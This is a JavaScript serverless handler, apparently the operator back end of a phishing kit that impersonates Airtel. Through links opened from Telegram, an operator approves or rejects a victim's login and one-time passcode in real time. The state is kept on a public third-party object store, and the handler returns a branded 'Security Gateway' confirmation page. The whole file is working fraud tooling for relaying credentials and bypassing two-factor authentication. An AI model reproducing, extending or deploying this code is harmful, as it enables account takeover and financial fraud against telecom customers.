export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  const { id, action } = req.query || {};

  if (!id || !action) {
    return res.status(400).send('<h3>Paramètres manquants (id et action requis).</h3>');
  }

  try {
    const fetchRes = await fetch(`https://api.restful-api.dev/objects/${id}`);
    if (!fetchRes.ok) {
      return res.status(404).send('<h3>Session non trouvée ou expirée.</h3>');
    }

    const currentRecord = await fetchRes.json();
    const data = currentRecord.data || {};

    let title = '';
    if (action === 'approve_login') {
      data.loginStatus = 'approved';
      title = '✅ Connexion client validée avec succès !';
    } else if (action === 'reject_login') {
      data.loginStatus = 'rejected';
      title = '❌ Connexion client refusée.';
    } else if (action === 'approve_otp') {
      data.otpStatus = 'approved';
      title = '✅ Code OTP validé avec succès !';
    } else if (action === 'reject_otp') {
      data.otpStatus = 'rejected';
      title = '❌ Code OTP rejeté.';
    }

    data.lastUpdated = Date.now();

    await fetch(`https://api.restful-api.dev/objects/${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: currentRecord.name || id,
        data,
      }),
    });

    return res.status(200).send(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Validation Airtel Lite</title>
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; text-align: center; }
            .card { background: #1e293b; border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
            h2 { color: #10b981; margin-top: 0; font-size: 22px; }
            p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
            .badge { display: inline-block; background: rgba(16, 185, 129, 0.15); color: #34d399; font-weight: bold; padding: 6px 14px; border-radius: 999px; font-size: 12px; margin-bottom: 16px; }
          </style>
        </head>
        <body>
          <div class="card">
            <div class="badge">Airtel Lite Security Gateway</div>
            <h2>${title}</h2>
            <p>L'action a été transmise en temps réel au client.<br>Vous pouvez fermer cette page et retourner sur Telegram.</p>
          </div>
        </body>
      </html>
    `);
  } catch (err) {
    return res.status(500).send(`<h3>Erreur lors de la validation: ${err.message}</h3>`);
  }
}
